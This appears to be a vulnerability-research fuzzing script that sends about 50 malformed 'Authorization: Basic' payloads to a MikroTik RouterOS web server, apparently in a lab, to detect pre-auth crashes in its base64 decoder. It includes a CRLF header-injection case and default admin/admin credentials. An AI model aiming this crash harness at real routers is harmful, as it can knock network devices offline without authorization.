#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 -- www Binary Base64 Decoder Overflow Testing
Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS])

Tests (~50): Targeting nv::base64Decode via the Authorization: Basic header.

The www binary imports nv::base64Decode at PLT 0x804d1f0. No NX, no canary,
no PIE. If the decoder writes to a fixed-size stack buffer without checking
decoded length, it is a direct stack buffer overflow — pre-auth RCE potential.

Test Categories:
  1. Oversized base64 in Authorization header (~10 tests)
     - Decoded sizes: 256, 512, 1K, 2K, 4K, 8K, 16K, 64K, 128K, 1MB
  2. Invalid base64 characters (~8 tests)
     - High bytes 0x80-0xFF, control chars 0x00-0x1F, non-base64 ASCII, nulls
  3. Padding variants (~6 tests)
     - Missing, extra, wrong position, padding in middle
  4. Base64 decoding to binary with nulls (~5 tests)
     - Null bytes at start, middle, end, throughout, alternating
  5. Extremely long username:password (~7 tests)
     - 1K:1K, 10K user, 10K pass, colon positions, no colon, multi-colon
  6. Base64 partial/truncated (~6 tests)
     - Cut at 1, 2, 3, 4 byte boundaries; single char; huge truncated
  7. Base64 with whitespace (~4 tests)
     - Embedded newlines, tabs, spaces, CRLF
  8. Non-standard base64 (~4 tests)
     - URL-safe (- and _), base32, hex-encoded, mixed alphabets

Evidence: evidence/attack_www_base64.json
"""

import base64
import json
import os
import socket
import sys
import time
import warnings
from datetime import datetime
from pathlib import Path

import requests

# Suppress warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# ── Configuration ────────────────────────────────────────────────────────────
# This script targets a SEPARATE pristine CHR instance ([REDACTED-INTERNAL-IP]),
# not the primary assessment target. Override common module defaults.
TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH_USER = "admin"
AUTH_PASS = "admin"
EVIDENCE_DIR = Path("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence")
TIMEOUT = 10
RECV_TIMEOUT = 5


# ── Logging ──────────────────────────────────────────────────────────────────

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


# ── Health Check ─────────────────────────────────────────────────────────────

def health_check(timeout=5):
    """Quick health check via REST API. Returns dict with status info."""
    try:
        r = requests.get(
            f"http://{TARGET}/rest/system/resource",
            auth=(AUTH_USER, AUTH_PASS),
            timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            return {
                "alive": True,
                "uptime": data.get("uptime"),
                "version": data.get("version"),
                "cpu_load": data.get("cpu-load"),
                "free_memory": data.get("free-memory"),
            }
        return {"alive": True, "status_code": r.status_code}
    except Exception:
        pass

    # Fallback: TCP connect on port 80
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.close()
        return {"alive": True, "method": "tcp_connect"}
    except Exception:
        return {"alive": False}


def parse_uptime_to_seconds(uptime_str):
    """Parse MikroTik uptime string like '2h12m19s' to total seconds."""
    import re
    if not uptime_str or uptime_str == "unknown":
        return None
    total = 0
    m = re.findall(r'(\d+)([wdhms])', uptime_str)
    for val, unit in m:
        val = int(val)
        if unit == 'w':
            total += val * 604800
        elif unit == 'd':
            total += val * 86400
        elif unit == 'h':
            total += val * 3600
        elif unit == 'm':
            total += val * 60
        elif unit == 's':
            total += val
    return total if m else None


def wait_for_router(max_wait=90, check_interval=5):
    """Wait for router to come back online after a potential crash/reboot."""
    log(f"  Waiting for router to recover (max {max_wait}s)...")
    start = time.time()
    while time.time() - start < max_wait:
        status = health_check(timeout=3)
        if status.get("alive"):
            log(f"  Router is back online: {status}")
            return status
        time.sleep(check_interval)
    log(f"  Router did not respond within {max_wait}s!")
    return {"alive": False, "waited": max_wait}


# ── Raw HTTP Sender ──────────────────────────────────────────────────────────

def send_raw_auth_request(b64_payload, timeout=RECV_TIMEOUT):
    """
    Send a raw HTTP request with Authorization: Basic {b64_payload}.
    Returns dict with response info or error/timeout indication.
    Uses raw sockets to avoid requests library sanitizing the payload.
    """
    request = (
        f"GET /rest/system/resource HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: Basic {b64_payload}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(request.encode("latin-1", errors="replace"))

        # Receive response
        response_data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response_data += chunk
                # Cap at 8KB to avoid memory issues with large responses
                if len(response_data) > 8192:
                    break
            except socket.timeout:
                break
        s.close()

        # Parse response
        response_text = response_data.decode("latin-1", errors="replace")
        status_code = 0
        status_line = ""
        body = ""

        if response_text:
            lines = response_text.split("\r\n")
            if lines:
                status_line = lines[0]
                parts = status_line.split(" ", 2)
                if len(parts) >= 2:
                    try:
                        status_code = int(parts[1])
                    except ValueError:
                        pass

            # Extract body (after double CRLF)
            body_split = response_text.split("\r\n\r\n", 1)
            if len(body_split) > 1:
                body = body_split[1][:500]

        return {
            "status_code": status_code,
            "status_line": status_line,
            "body": body,
            "response_size": len(response_data),
            "error": None,
        }

    except socket.timeout:
        try:
            s.close()
        except Exception:
            pass
        return {
            "status_code": 0,
            "status_line": "",
            "body": "",
            "response_size": 0,
            "error": "timeout",
        }
    except ConnectionResetError:
        return {
            "status_code": 0,
            "status_line": "",
            "body": "",
            "response_size": 0,
            "error": "connection_reset",
        }
    except BrokenPipeError:
        return {
            "status_code": 0,
            "status_line": "",
            "body": "",
            "response_size": 0,
            "error": "broken_pipe",
        }
    except Exception as e:
        return {
            "status_code": 0,
            "status_line": "",
            "body": "",
            "response_size": 0,
            "error": str(e),
        }


def send_raw_auth_binary(raw_bytes, timeout=RECV_TIMEOUT):
    """
    Send a raw HTTP request with binary Authorization header content.
    For payloads that contain bytes invalid in text encoding.
    """
    header_prefix = (
        f"GET /rest/system/resource HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: Basic "
    ).encode("ascii")
    header_suffix = b"\r\nConnection: close\r\n\r\n"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(header_prefix + raw_bytes + header_suffix)

        response_data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response_data += chunk
                if len(response_data) > 8192:
                    break
            except socket.timeout:
                break
        s.close()

        response_text = response_data.decode("latin-1", errors="replace")
        status_code = 0
        status_line = ""
        body = ""

        if response_text:
            lines = response_text.split("\r\n")
            if lines:
                status_line = lines[0]
                parts = status_line.split(" ", 2)
                if len(parts) >= 2:
                    try:
                        status_code = int(parts[1])
                    except ValueError:
                        pass
            body_split = response_text.split("\r\n\r\n", 1)
            if len(body_split) > 1:
                body = body_split[1][:500]

        return {
            "status_code": status_code,
            "status_line": status_line,
            "body": body,
            "response_size": len(response_data),
            "error": None,
        }

    except socket.timeout:
        try:
            s.close()
        except Exception:
            pass
        return {"status_code": 0, "status_line": "", "body": "",
                "response_size": 0, "error": "timeout"}
    except ConnectionResetError:
        return {"status_code": 0, "status_line": "", "body": "",
                "response_size": 0, "error": "connection_reset"}
    except BrokenPipeError:
        return {"status_code": 0, "status_line": "", "body": "",
                "response_size": 0, "error": "broken_pipe"}
    except Exception as e:
        return {"status_code": 0, "status_line": "", "body": "",
                "response_size": 0, "error": str(e)}


# ── Evidence Collector (self-contained for this target) ──────────────────────

class EvidenceCollector:
    """Evidence collection for base64 decoder testing."""

    def __init__(self):
        self.results = {
            "metadata": {
                "script": "attack_www_base64.py",
                "target": TARGET,
                "port": PORT,
                "phase": "www_base64_decoder",
                "binary": "www",
                "function": "nv::base64Decode (PLT 0x804d1f0)",
                "protections": "No NX, No canary, No PIE",
                "start_time": datetime.now().isoformat(),
                "end_time": None,
                "total_tests": 0,
                "anomalies": 0,
                "crashes_detected": 0,
            },
            "tests": [],
            "findings": [],
        }

        # Record initial router state
        status = health_check()
        if status.get("alive"):
            self.results["metadata"]["router_version"] = status.get("version")
            self.results["metadata"]["initial_uptime"] = status.get("uptime")

    def add_test(self, category, name, description, result,
                 details=None, anomaly=False):
        """Record a test result."""
        test = {
            "id": self.results["metadata"]["total_tests"] + 1,
            "category": category,
            "name": name,
            "description": description,
            "result": result,
            "anomaly": anomaly,
            "timestamp": datetime.now().isoformat(),
        }
        if details:
            test["details"] = details
        self.results["tests"].append(test)
        self.results["metadata"]["total_tests"] += 1
        if anomaly:
            self.results["metadata"]["anomalies"] += 1
        status_marker = "ANOMALY" if anomaly else "OK"
        log(f"  [{status_marker}] {name}: {result}", )

    def add_finding(self, severity, title, description,
                    evidence_refs=None, cwe=None, cvss=None):
        """Record a potential security finding."""
        finding = {
            "id": len(self.results["findings"]) + 1,
            "severity": severity,
            "title": title,
            "description": description,
            "timestamp": datetime.now().isoformat(),
        }
        if evidence_refs:
            finding["evidence_refs"] = evidence_refs
        if cwe:
            finding["cwe"] = cwe
        if cvss:
            finding["cvss_estimate"] = cvss
        self.results["findings"].append(finding)
        log(f"  FINDING [{severity}]: {title}")

    def record_crash(self):
        """Increment the crash counter."""
        self.results["metadata"]["crashes_detected"] += 1

    def save(self, filename):
        """Save evidence JSON."""
        self.results["metadata"]["end_time"] = datetime.now().isoformat()

        # Final health check
        final_health = health_check()
        self.results["metadata"]["final_health"] = final_health

        out = EVIDENCE_DIR / filename
        with open(out, "w") as f:
            json.dump(self.results, f, indent=2, default=str)
        log(f"Evidence saved to {out}")
        return out

    def summary(self):
        """Print summary."""
        m = self.results["metadata"]
        f = len(self.results["findings"])
        log("=" * 60)
        log(f"Complete: {m['total_tests']} tests, {m['anomalies']} anomalies, "
            f"{m['crashes_detected']} crashes, {f} findings")
        log("=" * 60)


# ── Test Runner with Crash Detection ─────────────────────────────────────────

def run_test(ec, category, name, description, payload,
             is_binary=False, extra_details=None):
    """
    Run a single base64 test case with pre/post health checks.

    1. Health check BEFORE
    2. Send payload
    3. Health check AFTER
    4. If router went down -> CRITICAL finding, wait for recovery

    Returns the response dict.
    """
    # Pre-test health
    pre_health = health_check(timeout=3)
    pre_alive = pre_health.get("alive", False)
    pre_uptime = pre_health.get("uptime", "unknown")

    if not pre_alive:
        log(f"  Router down before test '{name}' -- waiting for recovery...")
        wait_for_router()
        pre_health = health_check(timeout=3)
        pre_alive = pre_health.get("alive", False)
        pre_uptime = pre_health.get("uptime", "unknown")
        if not pre_alive:
            ec.add_test(category, name, description,
                        "SKIPPED - router not reachable",
                        anomaly=True)
            return None

    # Send the payload
    if is_binary:
        resp = send_raw_auth_binary(payload, timeout=RECV_TIMEOUT)
    else:
        resp = send_raw_auth_request(payload, timeout=RECV_TIMEOUT)

    # Brief pause before post-health check
    time.sleep(0.3)

    # Post-test health
    post_health = health_check(timeout=5)
    post_alive = post_health.get("alive", False)
    post_uptime = post_health.get("uptime", "unknown")

    # Detect crash: router was alive before but not after,
    # or uptime reset (reboot — uptime DECREASED)
    crashed = False
    if pre_alive and not post_alive:
        crashed = True
    elif (pre_alive and post_alive and
          pre_uptime != "unknown" and post_uptime != "unknown"):
        # Parse uptime strings to seconds for proper comparison
        pre_secs = parse_uptime_to_seconds(pre_uptime)
        post_secs = parse_uptime_to_seconds(post_uptime)
        if pre_secs is not None and post_secs is not None:
            if post_secs < pre_secs:
                # Uptime DECREASED = router rebooted
                crashed = True

    # Also treat connection_reset / broken_pipe + no post-health as crash
    if resp.get("error") in ("connection_reset", "broken_pipe", "timeout"):
        if not post_alive:
            crashed = True

    details = {
        "payload_size": len(payload) if isinstance(payload, (str, bytes)) else 0,
        "response_status": resp.get("status_code"),
        "response_error": resp.get("error"),
        "response_size": resp.get("response_size"),
        "response_body": resp.get("body", "")[:300],
        "pre_health_alive": pre_alive,
        "pre_uptime": pre_uptime,
        "post_health_alive": post_alive,
        "post_uptime": post_uptime,
        "crash_detected": crashed,
    }
    if extra_details:
        details.update(extra_details)

    anomaly = crashed or resp.get("error") is not None

    result_str = (
        f"Status={resp.get('status_code')}, "
        f"error={resp.get('error')}, "
        f"crash={crashed}"
    )

    ec.add_test(category, name, description, result_str,
                details=details, anomaly=anomaly)

    if crashed:
        ec.record_crash()
        ec.add_finding(
            "CRITICAL",
            f"www process crash via Authorization header: {name}",
            f"The www binary crashed or the router rebooted after receiving "
            f"a crafted Authorization: Basic header. Pre-auth crash in "
            f"nv::base64Decode (no NX, no canary, no PIE) = potential "
            f"pre-auth RCE. Payload size: {details['payload_size']} bytes.",
            cwe="CWE-120",
            cvss="9.8",
        )
        # Wait for router to come back
        log(f"  CRASH DETECTED during '{name}' -- waiting for recovery...")
        wait_for_router(max_wait=120)
        time.sleep(2)  # Extra settle time

    return resp


# =============================================================================
# Category 1: Oversized base64 in Authorization header (~10 tests)
# =============================================================================

def test_oversized_base64(ec):
    """Base64 encoding of strings that decode to large sizes."""
    log("=" * 60)
    log("Category 1: Oversized Base64 in Authorization Header")
    log("=" * 60)
    cat = "oversized_base64"

    # Decoded sizes to test. Format: "A"*N + ":" + "B"*N
    # The actual decoded size is 2*N + 1 (for the colon)
    decode_sizes = [256, 512, 1024, 2048, 4096, 8192, 16384,
                    65536, 131072, 1048576]

    for decoded_size in decode_sizes:
        # Split evenly between username and password
        half = decoded_size // 2
        raw = b"A" * half + b":" + b"B" * half
        b64 = base64.b64encode(raw).decode("ascii")

        name = f"Oversized b64 (decode={decoded_size})"
        desc = (f"Base64-encode {decoded_size} bytes of 'A'*{half}:B*{half}, "
                f"b64 length={len(b64)}")

        run_test(ec, cat, name, desc, b64,
                 extra_details={
                     "decoded_size": decoded_size,
                     "b64_length": len(b64),
                     "username_length": half,
                     "password_length": half,
                 })

        # Small delay between large payload tests
        time.sleep(0.5)


# =============================================================================
# Category 2: Invalid base64 characters (~8 tests)
# =============================================================================

def test_invalid_base64_chars(ec):
    """Base64 strings containing characters outside the valid alphabet."""
    log("=" * 60)
    log("Category 2: Invalid Base64 Characters")
    log("=" * 60)
    cat = "invalid_b64_chars"

    # 2.1 - High bytes (0x80-0xFF) mixed into valid base64
    valid_b64 = base64.b64encode(b"admin:admin").decode("ascii")
    high_byte_payload = bytearray(valid_b64.encode("ascii"))
    # Insert high bytes at several positions
    for i in range(0, len(high_byte_payload), 4):
        if i < len(high_byte_payload):
            high_byte_payload[i] = 0x80 + (i % 128)
    run_test(ec, cat, "High bytes (0x80-0xFF) in base64",
             "Replace every 4th base64 char with high byte (0x80-0xFF)",
             bytes(high_byte_payload), is_binary=True,
             extra_details={"original_b64": valid_b64})

    # 2.2 - Control characters (0x00-0x1F)
    ctrl_payload = bytearray(valid_b64.encode("ascii"))
    for i in range(min(16, len(ctrl_payload))):
        ctrl_payload[i] = i  # 0x00 through 0x0F
    run_test(ec, cat, "Control characters (0x00-0x1F) in base64",
             "Replace first 16 base64 chars with control characters 0x00-0x0F",
             bytes(ctrl_payload), is_binary=True)

    # 2.3 - Non-base64 ASCII symbols
    symbols = "!@#$%^&*(){}[]|\\:\";<>,?~`"
    symbol_payload = symbols * 10  # ~260 chars of pure symbols
    run_test(ec, cat, "Non-base64 ASCII symbols (!@#$%...)",
             f"Send {len(symbol_payload)} chars of non-base64 symbols",
             symbol_payload,
             extra_details={"symbols": symbols})

    # 2.4 - Embedded null bytes in base64 string
    null_payload = b"YWRtaW46\x00\x00\x00\x00YWRtaW4="  # admin: + nulls + admin
    run_test(ec, cat, "Embedded nulls in base64 string",
             "Valid base64 with null bytes injected in the middle",
             null_payload, is_binary=True)

    # 2.5 - All 0xFF bytes
    all_ff = bytes([0xFF] * 256)
    run_test(ec, cat, "All 0xFF bytes (256 bytes)",
             "Send 256 bytes of 0xFF as Authorization header value",
             all_ff, is_binary=True)

    # 2.6 - Mixed valid and invalid: valid b64 interspersed with 0x00
    mixed = bytearray()
    for c in valid_b64.encode("ascii"):
        mixed.append(c)
        mixed.append(0x00)
    run_test(ec, cat, "Alternating valid base64 + null bytes",
             "Each base64 character followed by a null byte",
             bytes(mixed), is_binary=True,
             extra_details={"pattern": "char-null-char-null..."})

    # 2.7 - Pure binary random-ish data (non-ASCII)
    binary_payload = bytes(range(256)) * 4  # 1024 bytes, all values 0x00-0xFF
    run_test(ec, cat, "Full byte range 0x00-0xFF (1024 bytes)",
             "Send all 256 byte values repeated 4 times",
             binary_payload, is_binary=True)

    # 2.8 - DEL character and extended ASCII
    del_payload = b"\x7F" * 512
    run_test(ec, cat, "DEL character (0x7F) repeated 512 times",
             "Send 512 DEL (0x7F) characters as base64",
             del_payload, is_binary=True)


# =============================================================================
# Category 3: Padding variants (~6 tests)
# =============================================================================

def test_padding_variants(ec):
    """Test base64 padding edge cases."""
    log("=" * 60)
    log("Category 3: Base64 Padding Variants")
    log("=" * 60)
    cat = "padding_variants"

    valid_b64 = base64.b64encode(b"admin:admin").decode("ascii")

    # 3.1 - Missing padding (strip = signs)
    stripped = valid_b64.rstrip("=")
    run_test(ec, cat, "Missing padding (= stripped)",
             f"Valid base64 with all padding removed: '{stripped}'",
             stripped,
             extra_details={"original": valid_b64, "stripped": stripped})

    # 3.2 - Extra padding (many = signs)
    extra_pad = valid_b64.rstrip("=") + "=" * 32
    run_test(ec, cat, "Extra padding (32 = signs)",
             f"Base64 with 32 trailing = signs",
             extra_pad,
             extra_details={"trailing_equals": 32})

    # 3.3 - Massive padding (1000 = signs)
    massive_pad = valid_b64.rstrip("=") + "=" * 1000
    run_test(ec, cat, "Massive padding (1000 = signs)",
             "Base64 with 1000 trailing = signs",
             massive_pad,
             extra_details={"trailing_equals": 1000})

    # 3.4 - Padding in middle of string
    mid = len(valid_b64) // 2
    middle_pad = valid_b64[:mid] + "====" + valid_b64[mid:]
    run_test(ec, cat, "Padding in middle of string",
             "Insert ==== in the middle of valid base64",
             middle_pad,
             extra_details={"insert_position": mid})

    # 3.5 - Only padding characters
    only_pad = "=" * 100
    run_test(ec, cat, "Only padding (100 = signs)",
             "Send 100 = signs as the entire base64 string",
             only_pad)

    # 3.6 - Wrong padding position (= at start)
    wrong_pos = "==" + valid_b64
    run_test(ec, cat, "Padding at start of string",
             "Prepend == to valid base64",
             wrong_pos)


# =============================================================================
# Category 4: Base64 decoding to binary with nulls (~5 tests)
# =============================================================================

def test_binary_with_nulls(ec):
    """Base64-encode binary data containing null bytes."""
    log("=" * 60)
    log("Category 4: Base64 Decoding to Binary with Nulls")
    log("=" * 60)
    cat = "binary_nulls"

    # 4.1 - Null at start of decoded data
    data = b"\x00" * 16 + b"admin:admin"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "Null bytes at start of decoded data",
             "Base64-encode 16 null bytes followed by admin:admin",
             b64,
             extra_details={"decoded_hex": data.hex()[:100]})

    # 4.2 - Null in middle (between username and password)
    data = b"admin\x00\x00\x00\x00:admin"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "Null bytes in middle of username",
             "admin + 4 nulls + :admin -- tests C string truncation",
             b64,
             extra_details={"decoded_hex": data.hex()})

    # 4.3 - Null after colon (password starts with null)
    data = b"admin:\x00\x00\x00\x00password"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "Null bytes at start of password",
             "admin: + 4 nulls + password -- password truncation test",
             b64,
             extra_details={"decoded_hex": data.hex()})

    # 4.4 - All nulls (large)
    data = b"\x00" * 4096
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "4096 null bytes base64-encoded",
             "Base64-encode 4096 null bytes -- stress C string functions",
             b64,
             extra_details={"decoded_size": 4096})

    # 4.5 - Alternating data and nulls
    data = b""
    for i in range(512):
        data += bytes([i % 256]) + b"\x00"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "Alternating byte + null (1024 bytes)",
             "Every other byte is null -- tests strlen vs memcpy behavior",
             b64,
             extra_details={"decoded_size": len(data), "pattern": "byte-null"})


# =============================================================================
# Category 5: Extremely long username:password (~7 tests)
# =============================================================================

def test_long_credentials(ec):
    """Test extremely long username and password combinations."""
    log("=" * 60)
    log("Category 5: Extremely Long Username:Password")
    log("=" * 60)
    cat = "long_credentials"

    # 5.1 - 1000-char username : 1000-char password
    data = b"A" * 1000 + b":" + b"B" * 1000
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "1000-char user : 1000-char password",
             "Both username and password are 1000 characters",
             b64,
             extra_details={"user_len": 1000, "pass_len": 1000})

    # 5.2 - 10000-char username : short password
    data = b"X" * 10000 + b":pw"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "10000-char username : 2-char password",
             "Very long username with short password",
             b64,
             extra_details={"user_len": 10000, "pass_len": 2})

    # 5.3 - Short username : 10000-char password
    data = b"u:" + b"P" * 10000
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "1-char username : 10000-char password",
             "Short username with very long password",
             b64,
             extra_details={"user_len": 1, "pass_len": 10000})

    # 5.4 - No colon at all (no user/pass split)
    data = b"A" * 2000  # No colon
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "2000 chars with no colon separator",
             "Base64 decodes to 2000 'A's with no colon -- tests split logic",
             b64,
             extra_details={"has_colon": False, "decoded_size": 2000})

    # 5.5 - Colon at position 0 (empty username)
    data = b":" + b"B" * 2000
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "Empty username (colon at pos 0) : 2000-char pass",
             "Colon is first character -- empty username edge case",
             b64,
             extra_details={"user_len": 0, "pass_len": 2000})

    # 5.6 - Multiple colons (ambiguous split)
    data = b"user:pass:extra:data:more:colons"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "Multiple colons in credentials",
             "6 colons in decoded string -- tests first-colon split behavior",
             b64,
             extra_details={"colon_count": 5, "decoded": data.decode()})

    # 5.7 - Colon at end (empty password)
    data = b"A" * 2000 + b":"
    b64 = base64.b64encode(data).decode("ascii")
    run_test(ec, cat, "2000-char username : empty password (trailing colon)",
             "Colon is last character -- empty password edge case",
             b64,
             extra_details={"user_len": 2000, "pass_len": 0})


# =============================================================================
# Category 6: Base64 partial/truncated (~6 tests)
# =============================================================================

def test_truncated_base64(ec):
    """Test base64 strings cut at various positions."""
    log("=" * 60)
    log("Category 6: Base64 Partial/Truncated")
    log("=" * 60)
    cat = "truncated_b64"

    valid_b64 = base64.b64encode(b"admin:admin").decode("ascii")
    # YWRtaW46YWRtaW4= (16 chars)

    # 6.1 - Single character
    run_test(ec, cat, "Single character base64 ('Y')",
             "Send just 'Y' as the base64 payload (1 byte boundary)",
             "Y")

    # 6.2 - Cut at 2-byte boundary
    run_test(ec, cat, "Truncated at 2 bytes ('YW')",
             "Base64 cut after 2 characters (incomplete 4-char block)",
             "YW")

    # 6.3 - Cut at 3-byte boundary
    run_test(ec, cat, "Truncated at 3 bytes ('YWR')",
             "Base64 cut after 3 characters (incomplete 4-char block)",
             "YWR")

    # 6.4 - Cut at 4-byte boundary (complete block, partial data)
    run_test(ec, cat, "Truncated at 4 bytes ('YWRt')",
             "Base64 cut after 4 characters (one complete block)",
             "YWRt")

    # 6.5 - Empty base64 string
    run_test(ec, cat, "Empty base64 string",
             "Send empty string as Authorization: Basic value",
             "")

    # 6.6 - Large base64 truncated mid-block
    large_data = b"A" * 8192 + b":" + b"B" * 8192
    large_b64 = base64.b64encode(large_data).decode("ascii")
    # Truncate at a non-4-boundary position
    truncated = large_b64[:len(large_b64) * 3 // 4 + 1]  # ~75% + 1 char
    run_test(ec, cat, f"Large base64 truncated mid-block ({len(truncated)} chars)",
             f"16K payload base64 truncated at non-4-aligned position",
             truncated,
             extra_details={
                 "original_b64_len": len(large_b64),
                 "truncated_len": len(truncated),
             })


# =============================================================================
# Category 7: Base64 with whitespace (~4 tests)
# =============================================================================

def test_whitespace_base64(ec):
    """Test base64 strings with embedded whitespace characters."""
    log("=" * 60)
    log("Category 7: Base64 with Whitespace")
    log("=" * 60)
    cat = "whitespace_b64"

    valid_b64 = base64.b64encode(b"admin:admin").decode("ascii")

    # 7.1 - Embedded newlines (MIME-style line folding)
    folded = ""
    for i in range(0, len(valid_b64), 4):
        folded += valid_b64[i:i+4] + "\n"
    run_test(ec, cat, "Base64 with embedded newlines (MIME folding)",
             "Insert \\n after every 4 base64 characters",
             folded,
             extra_details={"newline_count": folded.count("\n")})

    # 7.2 - Embedded tabs
    tabbed = "\t".join(valid_b64[i:i+2] for i in range(0, len(valid_b64), 2))
    run_test(ec, cat, "Base64 with embedded tabs",
             "Insert \\t after every 2 base64 characters",
             tabbed,
             extra_details={"tab_count": tabbed.count("\t")})

    # 7.3 - Embedded spaces
    spaced = " ".join(valid_b64[i:i+4] for i in range(0, len(valid_b64), 4))
    run_test(ec, cat, "Base64 with embedded spaces",
             "Insert space after every 4 base64 characters",
             spaced)

    # 7.4 - Embedded CRLF (HTTP header injection attempt)
    crlf = valid_b64[:8] + "\r\n" + valid_b64[8:]
    run_test(ec, cat, "Base64 with embedded CRLF (header injection test)",
             "Insert \\r\\n in middle of base64 -- potential header injection",
             crlf,
             extra_details={"injection_test": True})


# =============================================================================
# Category 8: Non-standard base64 (~4 tests)
# =============================================================================

def test_nonstandard_base64(ec):
    """Test non-standard base64 variants and encodings."""
    log("=" * 60)
    log("Category 8: Non-Standard Base64 Encodings")
    log("=" * 60)
    cat = "nonstandard_b64"

    # 8.1 - URL-safe base64 (- and _ instead of + and /)
    raw = b"admin:admin+/test"
    std_b64 = base64.b64encode(raw).decode("ascii")
    url_b64 = base64.urlsafe_b64encode(raw).decode("ascii")
    run_test(ec, cat, "URL-safe base64 (- and _ instead of + and /)",
             f"Standard: {std_b64} vs URL-safe: {url_b64}",
             url_b64,
             extra_details={
                 "standard_b64": std_b64,
                 "urlsafe_b64": url_b64,
                 "differs": std_b64 != url_b64,
             })

    # 8.2 - Base32 instead of base64
    b32 = base64.b32encode(b"admin:admin").decode("ascii")
    run_test(ec, cat, "Base32 instead of base64",
             f"Send base32-encoded credentials: {b32}",
             b32,
             extra_details={"encoding": "base32", "value": b32})

    # 8.3 - Hex-encoded instead of base64
    hex_encoded = b"admin:admin".hex()
    run_test(ec, cat, "Hex encoding instead of base64",
             f"Send hex-encoded credentials: {hex_encoded}",
             hex_encoded,
             extra_details={"encoding": "hex", "value": hex_encoded})

    # 8.4 - Mixed base64 alphabets (standard + urlsafe mixed)
    # Create a payload that mixes + and -, / and _
    mixed = std_b64.replace("+", "-", 1)  # Replace first + with -
    if "/" in mixed:
        mixed = mixed.replace("/", "_", 1)
    # Also add some truly valid but confusing content
    mixed = mixed + "/-_+" * 20
    run_test(ec, cat, "Mixed base64 alphabets (standard + urlsafe chars)",
             "Mix of +/ and -_ characters in same payload",
             mixed,
             extra_details={"payload": mixed})


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 -- www Base64 Decoder Testing")
    log(f"Target: {TARGET}:{PORT}")
    log("Binary: www | Function: nv::base64Decode (PLT 0x804d1f0)")
    log("Protections: No NX, No canary, No PIE")
    log("=" * 60)

    # Pre-flight check
    status = health_check()
    if not status.get("alive"):
        log("FATAL: Router at {TARGET} is not responding. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={status.get('version')}, "
        f"uptime={status.get('uptime')}")

    # Initialize evidence collector
    ec = EvidenceCollector()

    try:
        # Category 1: Oversized base64 (~10 tests)
        test_oversized_base64(ec)

        # Category 2: Invalid base64 characters (~8 tests)
        test_invalid_base64_chars(ec)

        # Category 3: Padding variants (~6 tests)
        test_padding_variants(ec)

        # Category 4: Binary with nulls (~5 tests)
        test_binary_with_nulls(ec)

        # Category 5: Long credentials (~7 tests)
        test_long_credentials(ec)

        # Category 6: Truncated base64 (~6 tests)
        test_truncated_base64(ec)

        # Category 7: Whitespace in base64 (~4 tests)
        test_whitespace_base64(ec)

        # Category 8: Non-standard base64 (~4 tests)
        test_nonstandard_base64(ec)

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled error: {e}")
        import traceback
        traceback.print_exc()

    # Save evidence and print summary
    ec.save("attack_www_base64.json")
    ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
